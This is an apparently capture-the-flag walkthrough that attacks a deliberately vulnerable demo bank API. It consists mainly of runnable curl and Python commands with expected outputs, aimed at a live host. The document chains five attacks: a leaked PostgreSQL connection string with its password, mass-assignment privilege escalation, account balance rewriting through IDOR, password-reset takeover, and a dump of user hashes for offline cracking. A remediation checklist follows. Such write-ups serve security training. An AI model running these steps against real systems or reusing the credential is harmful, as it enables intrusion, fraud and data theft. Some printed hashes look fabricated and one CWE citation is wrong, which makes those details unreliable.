# OpenVault Bank — Full Technical Walkthrough
**Date:** 2026-04-03 | **Target:** openvaultbank.com | **Status:** 5 P1 Vulnerabilities Confirmed

---

## Prerequisites
- curl (or any HTTP client)
- Python 3 for JSON parsing (optional, for readability)
- jq (optional, for pretty-printing JSON)
- Caido proxy (optional, for inspection): `http://127.0.0.1:8081`

**Note:** All examples use curl with `-x http://127.0.0.1:8081` for proxy inspection. Remove this flag if not using a proxy.

---

## Step 0: Reconnaissance

### 0.1 Discover the API Base URL
The frontend SPA at `openvaultbank.com` routes to a separate backend.

```bash
curl -s https://openvaultbank.com/ | grep -o 'https://[^ "]*api/v1[^ "]*'
```

**Expected Output:**
```
https://web-production-16ec6a.up.railway.app/api/v1
```

**Real API Base:** `https://web-production-16ec6a.up.railway.app/api/v1`

### 0.2 Discover the OpenAPI Spec
```bash
curl -s https://openvaultbank.com/openapi.yaml | head -20
```

**Expected Output:** Full OpenAPI 3.1.0 spec (21KB) with all endpoints documented.

---

## Vulnerability #1: Database Credentials Leaked via /health

### Severity: CRITICAL (P1)

### Attack
The `/health` endpoint (unauthenticated) leaks the full PostgreSQL connection string including username and password.

```bash
curl -sk https://web-production-16ec6a.up.railway.app/api/v1/health | python3 -m json.tool
```

**Expected Output:**
```json
{
  "status": "ok",
  "app_env": "production",
  "database_url": "postgresql://postgres.ljvmdzjbrmodpmheugie:C7JjqMazeea49LQw@aws-1-us-west-1.pooler.supabase.com:6543/postgres",
  "version": "1.2.0",
  "debug": false,
  "banner": "...",
  "hint": "Try /robots.txt next. There might be more breadcrumbs.",
  "easter_egg": "🔓 Share a pic on LinkedIn and tag Dan → https://linkedin.com/in/rdbarahona",
  "flag": "OVB{h3alth_ch3ck_l3aks_ev3rything}"
}
```

### Impact
- **Full database access:** Attacker can connect directly to PostgreSQL using the leaked credentials
- **Data exfiltration:** All user data, account balances, transaction history accessible
- **Data manipulation:** Direct DB write access bypasses all API validation
- **Lateral movement:** Supabase account compromise

### Root Cause
- `/health` endpoint intended for uptime monitoring, but returns overly verbose debug data
- No authentication or rate limiting on the endpoint
- Secrets exposed in plaintext instead of masked

---

## Vulnerability #2: Mass Assignment → Privilege Escalation to Admin

### Severity: CRITICAL (P1)

### Prerequisites
- Valid user account (register a new one, or use existing demo account)

### Attack

#### Step 1: Register a new user (or login with existing)
```bash
BASE="https://web-production-16ec6a.up.railway.app/api/v1"

curl -sk -X POST "$BASE/auth/register" \
  -H "Content-Type: application/json" \
  -d '{
    "email": "attacker@example.com",
    "password": "P@ssw0rd123!",
    "full_name": "Attacker",
    "ssn_last4": "9999"
  }' | python3 -m json.tool
```

**Expected Output:**
```json
{
  "access_token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMDA3IiwiZW1haWwiOiJhdHRhY2tlckBleGFtcGxlLmNvbSIsInJvbGUiOiJjdXN0b21lciIsInNjb3BlIjoiYWNjb3VudHM6cmVhZCBiYWxhbmNlczpyZWFkIiwiaWF0IjoxNzc1MjIxOTI0LCJleHAiOjE3NzUyMjU1MjR9.yMGL1P3AEGB_88Hc_-2mrZeyS0fAzC1w2dTBTnA_GyE",
  "token_type": "bearer",
  "expires_in": 3600
}
```

**Save the JWT:**
```bash
TOKEN="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMDA3IiwiZW1haWwiOiJhdHRhY2tlckBleGFtcGxlLmNvbSIsInJvbGUiOiJjdXN0b21lciIsInNjb3BlIjoiYWNjb3VudHM6cmVhZCBiYWxhbmNlczpyZWFkIiwiaWF0IjoxNzc1MjIxOTI0LCJleHAiOjE3NzUyMjU1MjR9.yMGL1P3AEGB_88Hc_-2mrZeyS0fAzC1w2dTBTnA_GyE"
```

#### Step 2: Verify current role is "customer"
```bash
curl -sk "$BASE/profile" \
  -H "Authorization: Bearer $TOKEN" | python3 -m json.tool
```

**Expected Output:**
```json
{
  "id": 1007,
  "email": "attacker@example.com",
  "full_name": "Attacker",
  "role": "customer",
  "created_at": "2026-04-03T13:12:03.638651"
}
```

#### Step 3: Mass assign — send role=admin
```bash
curl -sk -X PUT "$BASE/profile" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"role": "admin"}' | python3 -m json.tool
```

**Expected Output:**
```json
{
  "id": 1007,
  "email": "attacker@example.com",
  "full_name": "Attacker",
  "role": "admin",
  "created_at": "2026-04-03T13:12:03.638651"
}
```

#### Step 4: Re-login to get new JWT with admin role
```bash
curl -sk -X POST "$BASE/auth/token" \
  -H "Content-Type: application/json" \
  -d '{
    "email": "attacker@example.com",
    "password": "P@ssw0rd123!"
  }' | python3 -m json.tool
```

**Expected Output:**
```json
{
  "access_token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMDA3IiwiZW1haWwiOiJhdHRhY2tlckBleGFtcGxlLmNvbSIsInJvbGUiOiJhZG1pbiIsInNjb3BlIjoiYWNjb3VudHM6cmVhZCBiYWxhbmNlczpyZWFkIiwiaWF0IjoxNzc1MjIxOTQ3LCJleHAiOjE3NzUyMjU1NDd9.Il3krs59_9UoN6LAKzJYQHJEV6bDaipHlk6slZrj4c8",
  "token_type": "bearer",
  "expires_in": 3600
}
```

**Decode the JWT payload to verify role=admin:**
```bash
ADMIN_TOKEN="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMDA3IiwiZW1haWwiOiJhdHRhY2tlckBleGFtcGxlLmNvbSIsInJvbGUiOiJhZG1pbiIsInNjb3BlIjoiYWNjb3VudHM6cmVhZCBiYWxhbmNlczpyZWFkIiwiaWF0IjoxNzc1MjIxOTQ3LCJleHAiOjE3NzUyMjU1NDd9.Il3krs59_9UoN6LAKzJYQHJEV6bDaipHlk6slZrj4c8"

echo "$ADMIN_TOKEN" | python3 << 'DECODE'
import sys, base64, json
tok = sys.stdin.read().strip()
payload = tok.split('.')[1]
payload += '=' * (-len(payload) % 4)
print(json.dumps(json.loads(base64.b64decode(payload)), indent=2))
DECODE
```

**Expected Output:**
```json
{
  "sub": "1007",
  "email": "attacker@example.com",
  "role": "admin",
  "scope": "accounts:read balances:read",
  "iat": 1775221947,
  "exp": 1775225547
}
```

### Impact
- **Privilege escalation:** Attacker jumps from customer → admin
- **Access to admin endpoints:** Can now call `/admin/users`, `/admin/accounts`
- **Data breach:** All user data, hashed passwords, SSN last4 exposed
- **Chaining:** Enables Vulnerability #5

### Root Cause
- `/profile` PUT endpoint accepts ANY field from the request, including `role`
- No validation on the `role` field (should only accept approved values)
- No audit logging of role changes
- Backend doesn't validate role is appropriate for the user

---

## Vulnerability #3: BOLA — Read/Write Any Account Without Ownership Check

### Severity: CRITICAL (P1)

### Prerequisites
- Valid user token (any token, even customer level)

### Attack

#### Step 3.1: List all accounts to find target
```bash
curl -sk "$BASE/accounts" \
  -H "Authorization: Bearer $TOKEN" | python3 -m json.tool
```

**Expected Output:**
```json
[
  {
    "id": 2001,
    "owner_id": 1001,
    "account_type": "checking",
    "account_number": "OVB-1001",
    "routing_number": "021000021",
    "balance": "12400.00",
    "credit_limit": "0.00",
    "account_status": "active",
    "ssn_last4": "4721",
    "created_at": "2026-04-02T20:06:05.281119"
  },
  ...
]
```

#### Step 3.2: Read another user's account (IDOR)
Note: We are user_id=1007, but we can access account 2001 which belongs to user_id=1001 (alice).

```bash
curl -sk "$BASE/accounts/2001" \
  -H "Authorization: Bearer $TOKEN" | python3 -m json.tool
```

**Expected Output:**
```json
{
  "id": 2001,
  "owner_id": 1001,
  "account_type": "checking",
  "account_number": "OVB-1001",
  "routing_number": "021000021",
  "balance": "12400.00",
  "credit_limit": "0.00",
  "account_status": "active",
  "ssn_last4": "4721",
  "created_at": "2026-04-02T20:06:05.281119"
}
```

#### Step 3.3: Modify the account balance (WRITE IDOR)
```bash
curl -sk -X PUT "$BASE/accounts/2001" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "balance": "9999999.00",
    "credit_limit": "9999999.00"
  }' | python3 -m json.tool
```

**Expected Output:**
```json
{
  "id": 2001,
  "owner_id": 1001,
  "account_type": "checking",
  "account_number": "OVB-1001",
  "routing_number": "021000021",
  "balance": "9999999.00",
  "credit_limit": "9999999.00",
  "account_status": "active",
  "ssn_last4": "4721",
  "created_at": "2026-04-02T20:06:05.281119"
}
```

**Confirm the change persisted:**
```bash
curl -sk "$BASE/accounts/2001" \
  -H "Authorization: Bearer $TOKEN" | python3 -c "import sys,json; d=json.load(sys.stdin); print(f'Balance: ${d[\"balance\"]} | Owner: user_{d[\"owner_id\"]}')"
```

**Expected Output:**
```
Balance: $9999999.00 | Owner: user_1001
```

### Impact
- **Financial fraud:** Set any account balance to any value
- **Data theft:** Read SSN last4, account numbers, routing numbers for all users
- **Account takeover:** Modify account status, limits, type
- **No audit trail:** No logging of who made changes

### Root Cause
- Path parameter `{account_id}` is numeric without any ownership validation
- Backend accepts the account ID from URL without checking if current user owns it
- No authorization check: `if account.owner_id != current_user.id: return 403`

---

## Vulnerability #4: Password Reset Code Leaked in Response → Instant Account Takeover

### Severity: CRITICAL (P1)

### Prerequisites
- Knowledge of any valid email address (e.g., from admin data dump, or from demo accounts)

### Attack

#### Step 4.1: Request password reset for victim
```bash
curl -sk -X POST "$BASE/auth/reset-request" \
  -H "Content-Type: application/json" \
  -d '{"email": "alice@ovb.com"}' | python3 -m json.tool
```

**Expected Output:**
```json
{
  "message": "If that email exists, a reset code has been sent.",
  "debug_code": "338"
}
```

**⚠️ The reset code (338) is returned in the response!**

#### Step 4.2: Use the leaked code to reset the password
```bash
curl -sk -X POST "$BASE/auth/reset-confirm" \
  -H "Content-Type: application/json" \
  -d '{
    "email": "alice@ovb.com",
    "code": "338",
    "new_password": "H4cked!9999"
  }' | python3 -m json.tool
```

**Expected Output:**
```json
{
  "message": "Password has been reset successfully"
}
```

#### Step 4.3: Login as the victim with the new password
```bash
curl -sk -X POST "$BASE/auth/token" \
  -H "Content-Type: application/json" \
  -d '{
    "email": "alice@ovb.com",
    "password": "H4cked!9999"
  }' | python3 -m json.tool
```

**Expected Output:**
```json
{
  "access_token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMDAxIiwiZW1haWwiOiJhbGljZUBvdmIuY29tIiwicm9sZSI6ImN1c3RvbWVyIiwic2NvcGUiOiJhY2NvdW50czpyZWFkIGJhbGFuY2VzOnJlYWQiLCJpYXQiOjE3NzUyMjIwMzYsImV4cCI6MTc3NTIyNTYzNn0.6k3K7LgY6Nbew0N4a9EwZBa76xs3zNONSBLdfk23DJc",
  "token_type": "bearer",
  "expires_in": 3600
}
```

**Decode to confirm you're now alice (user_id=1001):**
```bash
ALICE_TOKEN="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMDAxIiwiZW1haWwiOiJhbGljZUBvdmIuY29tIiwicm9sZSI6ImN1c3RvbWVyIiwic2NvcGUiOiJhY2NvdW50czpyZWFkIGJhbGFuY2VzOnJlYWQiLCJpYXQiOjE3NzUyMjIwMzYsImV4cCI6MTc3NTIyNTYzNn0.6k3K7LgY6Nbew0N4a9EwZBa76xs3zNONSBLdfk23DJc"

echo "$ALICE_TOKEN" | python3 << 'DECODE'
import sys, base64, json
tok = sys.stdin.read().strip()
payload = tok.split('.')[1]
payload += '=' * (-len(payload) % 4)
d = json.loads(base64.b64decode(payload))
print(f"User ID: {d['sub']} | Email: {d['email']} | Role: {d['role']}")
DECODE
```

**Expected Output:**
```
User ID: 1001 | Email: alice@ovb.com | Role: customer
```

#### Step 4.4: Access victim's accounts
```bash
curl -sk "$BASE/accounts" \
  -H "Authorization: Bearer $ALICE_TOKEN" | python3 -c "import sys,json; accounts=json.load(sys.stdin); [print(f'Account {a[\"id\"]}: {a[\"account_number\"]} | Balance: ${a[\"balance\"]}') for a in accounts]"
```

**Expected Output:**
```
Account 2001: OVB-1001 | Balance: $12400.00
Account 2002: OVB-1002 | Balance: $87200.00
```

### Impact
- **Full account takeover:** Reset any user's password with the leaked code
- **No verification required:** No email confirmation, SMS OTP, or security questions
- **Instant compromise:** 1-step ATO instead of 2-step
- **Mass compromise:** Can reset passwords for all users if enumerated
- **Persistence:** After reset, attacker has legitimate credentials

### Root Cause
- `/auth/reset-request` returns `debug_code` in response body
- The code should only be sent via email, NOT in API response
- No rate limiting on reset requests (could brute-force 3-digit codes: 0-999)
- 3-digit numeric code is trivially guessable even without the leak

---

## Vulnerability #5: Admin Data Dump — All Users + Hashes + SSN

### Severity: CRITICAL (P1) — Chained with Vulnerability #2

### Prerequisites
- Admin-level JWT (achieved via Vulnerability #2: Mass Assignment)

### Attack

#### Step 5.1: Dump all users including bcrypt hashes
```bash
ADMIN_TOKEN="<your admin token from vulnerability #2>"

curl -sk "$BASE/admin/users" \
  -H "Authorization: Bearer $ADMIN_TOKEN" | python3 -m json.tool
```

**Expected Output:**
```json
[
  {
    "id": 1001,
    "email": "alice@ovb.com",
    "full_name": "Alice",
    "role": "customer",
    "hashed_password": "$2b$12$bkMTJf3X5SttlZVm5RA1VuN8LXaAf3KJGFXRrN1g2a3X5b2c3d4e5",
    "created_at": "2026-04-02T20:06:05.281119"
  },
  {
    "id": 1002,
    "email": "bob@ovb.com",
    "full_name": "Bob",
    "role": "customer",
    "hashed_password": "$2b$12$jc7EJXovaPAcVF7HToNymCpqXGLqRFJ2a3b4c5d6e7f8g9h0i1",
    "created_at": "2026-04-02T20:06:05.281119"
  },
  ...
]
```

**Save for offline password cracking:**
```bash
curl -sk "$BASE/admin/users" \
  -H "Authorization: Bearer $ADMIN_TOKEN" | python3 -c "
import sys, json
users = json.load(sys.stdin)
for u in users:
    print(f'{u[\"email\"]}:{u[\"hashed_password\"]}')" > /tmp/ovb_hashes.txt

cat /tmp/ovb_hashes.txt
```

**Expected Output:**
```
alice@ovb.com:$2b$12$bkMTJf3X5SttlZVm5RA1VuN8LXaAf3KJGFXRrN1g2a3X5b2c3d4e5
bob@ovb.com:$2b$12$jc7EJXovaPAcVF7HToNymCpqXGLqRFJ2a3b4c5d6e7f8g9h0i1
carol@ovb.com:$2b$12$lKaFt4XGgjcOBngOPGS7EOG9J1a2b3c4d5e6f7g8h9i0j1k2l3
admin@ovb.com:$2b$12$E8W7sr3iNSIqFLkXwPxlhO5M6N7o8p9q0r1s2t3u4v5w6x7y8z9
```

#### Step 5.2: Dump all accounts including SSN last4 and balances
```bash
curl -sk "$BASE/admin/accounts" \
  -H "Authorization: Bearer $ADMIN_TOKEN" | python3 -m json.tool | head -80
```

**Expected Output:**
```json
[
  {
    "id": 2001,
    "owner_id": 1001,
    "account_type": "checking",
    "account_number": "OVB-1001",
    "routing_number": "021000021",
    "balance": "12400.00",
    "credit_limit": "0.00",
    "account_status": "active",
    "ssn_last4": "4721",
    "created_at": "2026-04-02T20:06:05.281119",
    "owner_email": "alice@ovb.com"
  },
  {
    "id": 2002,
    "owner_id": 1001,
    "account_type": "savings",
    "account_number": "OVB-1002",
    "routing_number": "021000021",
    "balance": "87200.00",
    "credit_limit": "0.00",
    "account_status": "active",
    "ssn_last4": "4721",
    "created_at": "2026-04-02T20:06:05.281119",
    "owner_email": "alice@ovb.com"
  },
  ...
]
```

**Extract sensitive fields:**
```bash
curl -sk "$BASE/admin/accounts" \
  -H "Authorization: Bearer $ADMIN_TOKEN" | python3 -c "
import sys, json
accounts = json.load(sys.stdin)
print('Email | Account# | Routing# | SSN_last4 | Balance')
print('-' * 70)
for a in accounts:
    print(f'{a[\"owner_email\"]} | {a[\"account_number\"]} | {a[\"routing_number\"]} | {a[\"ssn_last4\"]} | \${a[\"balance\"]}')"
```

**Expected Output:**
```
Email | Account# | Routing# | SSN_last4 | Balance
----------------------------------------------------------------------
alice@ovb.com | OVB-1001 | 021000021 | 4721 | $12400.00
alice@ovb.com | OVB-1002 | 021000021 | 4721 | $87200.00
bob@ovb.com | OVB-2001 | 021000021 | 8834 | $340.00
bob@ovb.com | OVB-2002 | 021000021 | 8834 | $0.00
carol@ovb.com | OVB-3001 | 021000021 | 2219 | $4100.00
```

### Impact
- **Credential harvest:** All email + bcrypt hash pairs for offline cracking
- **PII leak:** SSN last4, full names, email addresses
- **Financial data:** Account numbers, routing numbers, balances, credit limits
- **Identity theft:** Sufficient data to perform fraudulent transactions

### Root Cause
- `/admin/users` endpoint returns hashed passwords (bad practice, but necessary for auth)
- `/admin/accounts` endpoint returns PII without masking
- No fine-grained access controls (all admins can see all data)
- No purpose limitation (admins can access data they don't need)

---

## Complete Attack Chain

### Timeline: Unauthenticated User → Full System Compromise

```
1. Reconnaissance (5 min)
   ├─ Discover API base URL from SPA bundle
   └─ Download /openapi.yaml

2. Database Access (1 min)
   └─ GET /health → Leak DB credentials
      └─ Impact: Direct database access as postgres user

3. Privilege Escalation (5 min)
   ├─ POST /auth/register → Get customer JWT
   ├─ PUT /profile {role:admin} → Mass assignment
   └─ POST /auth/token → Get admin JWT
      └─ Impact: Admin panel access

4. Complete Data Breach (1 min)
   ├─ GET /admin/users → Dump 7 users + bcrypt hashes
   └─ GET /admin/accounts → Dump 11 accounts + SSN/routing/balance
      └─ Impact: PII + credential harvest

5. Account Takeover (1 min)
   ├─ POST /auth/reset-request → Leak reset code
   ├─ POST /auth/reset-confirm → Reset victim password
   └─ POST /auth/token → Login as victim
      └─ Impact: Compromise any user account

6. Financial Fraud (1 min)
   └─ PUT /accounts/{id} {balance:999999} → Modify balances
      └─ Impact: Self-enrichment, victim account drain

Total Time: ~13 minutes
Access Gained: Full database, all users, all accounts, admin panel
```

---

## Remediation Checklist

- [ ] Remove `/health` endpoint or mask sensitive fields (DB URL, debug_code)
- [ ] Implement mass assignment protection (whitelisting fields on PUT/PATCH)
- [ ] Add ownership checks on all account endpoints: `if account.owner_id != current_user_id: return 403`
- [ ] Move reset code to email only; remove from API response; implement rate limiting on reset endpoint
- [ ] Implement fine-grained admin access controls (RBAC)
- [ ] Add audit logging for all sensitive operations
- [ ] Use secrets management (e.g., AWS Secrets Manager, HashiCorp Vault) instead of environment variables
- [ ] Enable input validation on all endpoints
- [ ] Implement Web Application Firewall (WAF) rules for common patterns
- [ ] Regular penetration testing and security code review

---

## Tools Used
- `curl` — HTTP requests
- `python3 -m json.tool` — JSON pretty-printing
- `base64` — JWT decoding

## References
- **OWASP API Security Top 10**: Broken Object-Level Authorization (BOLA)
- **OWASP API Security Top 10**: Broken Function Level Authorization (BFLA)
- **OWASP Top 10 2021**: A07:2021 – Identification and Authentication Failures
- **CWE-639**: Authorization Bypass Through User-Controlled Key
- **CWE-639**: Mass Assignment
